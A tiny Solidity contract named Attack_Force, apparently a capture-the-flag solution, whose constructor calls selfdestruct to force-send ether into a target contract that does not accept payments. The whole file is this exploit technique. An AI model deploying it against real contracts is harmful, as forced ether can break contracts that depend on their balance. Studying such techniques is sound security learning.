// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Attack_Force {
    constructor(address payable _target) payable{
        selfdestruct(_target);
    }
}
